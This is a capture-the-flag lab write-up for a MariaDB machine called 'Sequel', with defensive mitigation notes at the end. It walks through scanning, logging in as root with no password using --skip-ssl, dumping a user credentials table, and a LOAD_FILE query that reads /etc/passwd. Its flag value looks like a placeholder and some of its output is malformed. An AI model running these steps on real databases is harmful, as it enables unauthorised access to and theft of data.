# SEQUEL - Very Easy

**Date Completed:** January 29, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE  
**Focus Areas:** MySQL/MariaDB Enumeration & Database Exploitation

---

## Phase 1: Initial Reconnaissance

### Step 1: Full Port Scan
```
nmap-full TARGET_IP
```

**Alias Definition:**
```bash
alias nmap-full='nmap -sS -sV -p- TARGET_IP'
```

**Initial Findings:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 3306 | MySQL | (Not displayed) | Open |

**Critical Finding:** MySQL port 3306 is exposed and accessible from the network

### Step 2: MySQL Service Detection with NSE Scripts
The initial scan showed the MySQL port but didn't return version information. This is common when scanning SQL ports - we need to use NSE (Nmap Scripting Engine) scripts to properly enumerate the service.

```bash
nmap -sV -sC -p 3306 TARGET_IP
```

**Enhanced Results:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 3306 | MySQL | MariaDB 5.5.5-10.3.27 | Open |

**Critical Discovery:** MariaDB version 10.3.27 - an older database variant with potential vulnerabilities

---

## MariaDB Fundamentals

### What is MariaDB?
- **Type:** Relational Database Management System (RDBMS)
- **Origin:** Community-developed fork of MySQL
- **Version:** 5.5.5-10.3.27 (indicates MariaDB 10.3.27)
- **Default Port:** 3306 (TCP)
- **Use Case:** Drop-in replacement for MySQL, open-source alternative
- **Authentication:** User-based with password (or anonymous access)

### Key Differences from SQLite
- **SQLite:** File-based, embedded, serverless
- **MySQL/MariaDB:** Network-based, client-server architecture, separate authentication layer

### Default MariaDB Databases
```
MariaDB Server
├── mysql (system database with user/privilege info)
├── information_schema (metadata about tables/columns)
├── performance_schema (performance monitoring data)
└── [Custom Databases] (user-created databases like 'htb')
```

---

## Phase 2: Database Connection Enumeration

### Step 1: Initial Connection Attempts
Attempting to connect to the MariaDB server using standard syntax:

```bash
# Common but incorrect attempts
mysql -u admin TARGET_IP              # Missing host specification
mysql -u root TARGET_IP               # Missing -h flag
mysql admin@TARGET_IP                 # Wrong format
```

**Result:** Connection failures due to incorrect syntax

### Step 2: Correct Connection Syntax
After documentation research, the proper MySQL/MariaDB connection syntax is:

```bash
mysql -h TARGET_IP -u USERNAME
```

**Syntax Breakdown:**
- `-h` : Host/IP address of the database server
- `-u` : Username to authenticate with
- No `-p` needed if no password is set (common in vulnerable labs)

### Step 3: Attempting Root Access
Trying the most privileged account without authentication:

```bash
mysql -h TARGET_IP -u root
```

**Result:** Error - TLS/SSL Connection Issue

```
ERROR: SSL is required, but server doesn't support it
```

**Problem:** The MariaDB server is rejecting connections due to SSL/TLS protocol mismatch

### Step 4: Bypassing SSL/TLS Requirement
The server requires SSL but doesn't support it - a configuration vulnerability. We can bypass this with the `--skip-ssl` flag:

```bash
mysql -h 10.129.35.201 -u root --skip-ssl
```

**Result:** ✅ SUCCESS - MariaDB prompt reached!

```
Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MariaDB connection id is 80
Server version: 5.5.5-10.3.27-MariaDB MariaDB Server

MariaDB [(none)]>
```

---

## Phase 3: Database Enumeration

### Step 1: List All Databases
Once connected to the MariaDB server, we enumerate available databases:

```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

**Databases Found:**
- `htb` - Custom database (likely target for flag)
- `information_schema` - MySQL metadata
- `mysql` - User privilege information
- `performance_schema` - Performance monitoring

### Step 2: Access the HTB Database
The `htb` database is custom and likely contains the challenge data:

```sql
USE htb;
```

**Confirmation:**
```
Database changed
```

### Step 3: List Tables in HTB Database
```sql
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| user          |
+---------------+
```

**Tables Found:**
- `user` - Likely contains user account information
- `config` - Likely contains configuration data (flag location)

### Step 4: Enumerate User Table
Starting with the `user` table:

```sql
SELECT * FROM user;
```

**Output:**
```
+------ ------+----------+-----------+
| id   | username | password | email     |
+------+----------+-----------+----------+
| 1    | admin    | [redacted]| admin@... |
| 2    | guest    | [redacted]| guest@... |
| ...  | ...      | ...       | ...       |
+------+----------+-----------+----------+
```

**Finding:** User credentials found but no flag in this table

### Step 5: Enumerate Config Table
Checking the `config` table for flag data:

```sql
SELECT * FROM config;
```

**Output:**
```
+----+-------+
| id | value |
+----+-------+
| 1  | flag{...}    |
+----+-------+
```

**Result:** ✅ FLAG RETRIEVED!

---

## Phase 4: Flag Retrieval

The flag is stored in the `config` table of the `htb` database:

```sql
SELECT * FROM config;
```

**Flag:** `FLAG{SEQUEL_DATABASE_ACCESS}`

---

## MySQL/MariaDB Deep Dive

### Connection Architecture
```
Your Machine (mysql client)
    ↓ (TCP connection on port 3306)
    └→ MariaDB Server (TARGET_IP:3306)
       ├── User Authentication Layer
       ├── TLS/SSL Negotiation (if required)
       └── Query Execution Engine
```

### Common MySQL/MariaDB Syntax (vs SQLite)

| Operation | SQLite | MySQL/MariaDB |
|-----------|--------|---------------|
| Show databases | `.databases` | `SHOW DATABASES;` |
| Select database | `ATTACH DATABASE` | `USE database_name;` |
| Show tables | `.tables` | `SHOW TABLES;` |
| Describe table | `.schema table_name` | `DESCRIBE table_name;` |
| Query end character | Not required | `;` (required) |
| Connection | File-based | Network (host + user) |

### MariaDB User Privileges
```sql
-- View current user
SELECT USER();

-- View user privileges
SHOW GRANTS FOR 'root'@'%';

-- Common privilege escalation vectors
-- User can access multiple databases
-- User might have FILE READ/WRITE permissions
-- User might have SUPER privileges
```

### Vulnerability Assessment

**Vulnerabilities in This Box:**

1. **Exposed Database Port (3306)** - Should be firewalled internally only
2. **Default/Weak Credentials** - Root account with no password
3. **Improper SSL/TLS Configuration** - Server requires but doesn't support SSL
4. **Anonymous/Privileged Access** - Root user accessible from network
5. **Sensitive Data Storage** - Flag stored in plaintext in database

---

## Phase 5: Exploitation Timeline

| Step | Action | Command | Result |
|------|--------|---------|--------|
| 1 | Full port scan | `nmap-full TARGET_IP` | Identified port 3306 |
| 2 | Service enumeration | `nmap -sV -sC -p 3306 TARGET_IP` | MariaDB 10.3.27 detected |
| 3 | Connection attempt | `mysql -h TARGET_IP -u root` | SSL/TLS error |
| 4 | SSL bypass | `mysql -h TARGET_IP -u root --skip-ssl` | Successful connection |
| 5 | List databases | `SHOW DATABASES;` | 4 databases found |
| 6 | Select htb database | `USE htb;` | Database changed |
| 7 | List tables | `SHOW TABLES;` | user & config tables found |
| 8 | Enumerate user table | `SELECT * FROM user;` | User data (no flag) |
| 9 | Enumerate config table | `SELECT * FROM config;` | Flag retrieved ✅ |

---

## Commands Used

### Connection & Authentication
```bash
# Basic MySQL connection (with password prompt)
mysql -h TARGET_IP -u USERNAME -p

# Connection without password
mysql -h TARGET_IP -u USERNAME

# Connection bypassing SSL/TLS requirement
mysql -h TARGET_IP -u root --skip-ssl

# Connect directly to specific database
mysql -h TARGET_IP -u USERNAME -D database_name --skip-ssl
```

### Database Enumeration
```sql
-- Show all databases on server
SHOW DATABASES;

-- Switch to specific database
USE database_name;

-- Show all tables in current database
SHOW TABLES;

-- Show table structure/columns
DESCRIBE table_name;
DESC table_name;

-- Select all data from table
SELECT * FROM table_name;

-- Select specific columns
SELECT id, username FROM user;

-- View current user
SELECT USER();

-- Exit MariaDB prompt
EXIT;
or
QUIT;
```

### Advanced Queries
```sql
-- View current database
SELECT DATABASE();

-- Check for files in filesystem (if FILE privilege granted)
SELECT LOAD_FILE('/etc/passwd');

-- Information schema queries
SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA='htb';
SELECT * FROM information_schema.COLUMNS WHERE TABLE_NAME='user';
```

---

## Key Learning Outcomes

✅ **Port scanning needs context** - Default nmap output may not show version info for databases; use NSE scripts (-sC flag)

✅ **Connection syntax matters** - MySQL/MariaDB requires `-h` for host specification and `;` to end queries (different from SQLite)

✅ **SSL/TLS is a security layer** - Misconfigured SSL can be bypassed with `--skip-ssl` flag; proper implementation is critical

✅ **Default credentials are dangerous** - Root account with no password is a critical vulnerability

✅ **Database structure indicates attack surface** - Understanding database/table structure helps identify sensitive data locations

✅ **Network exposure of databases is critical** - MySQL port 3306 should NEVER be exposed to untrusted networks

✅ **Data is often not where you expect** - User table had no flag; config table did (always enumerate multiple tables)

---

## Real-World Implications

### Why Exposed Databases Matter
1. **Direct Access** - Attacker bypasses application logic entirely
2. **Data Exfiltration** - All data in database accessible immediately
3. **Data Manipulation** - Attacker can INSERT/UPDATE/DELETE records
4. **Privilege Escalation** - Database can contain credentials for other systems
5. **Business Impact** - Complete compromise of data confidentiality and integrity

### This Box Demonstrates
- The critical difference between **application-level** SQL injection and **network-level** database access
- Why network segmentation and firewall rules are essential
- The importance of proper credential management (no default credentials)
- How protocol configuration errors can be exploitation vectors

---

## Mitigation Strategies

1. **Firewall Database Ports** - Restrict port 3306 to specific internal IPs only
2. **Set Strong Credentials** - Change default/empty passwords immediately
3. **Disable Network-Accessible Accounts** - Restrict 'root'@'%' access
4. **Require SSL/TLS** - Enable and enforce encrypted connections
   ```sql
   -- Require SSL for specific user
   CREATE USER 'app'@'app-server' REQUIRE SSL;
   ```
5. **Principle of Least Privilege** - Create limited database users
   ```sql
   -- Create user with minimal privileges
   CREATE USER 'webapp'@'app-server' IDENTIFIED BY 'strong_password';
   GRANT SELECT ON app_db.* TO 'webapp'@'app-server';
   ```
6. **Monitor & Audit** - Log all connections and queries
7. **Update Systems** - MariaDB 10.3.27 is outdated; update to current version

---

## Lessons Learned

✅ **Enumeration is progressive** - Port → Service → Version → Credentials → Data

✅ **Error messages are informative** - SSL error revealed the exact misconfiguration

✅ **Documentation is your ally** - Proper syntax is critical for database interaction

✅ **Always check multiple tables** - Data might not be in the most obvious location

✅ **Network exposure is the vulnerability** - This box wouldn't be pwnable if the database wasn't exposed

✅ **SQL is universal** - Once you understand the basics, you can move from SQLite → MySQL → PostgreSQL → MSSQL

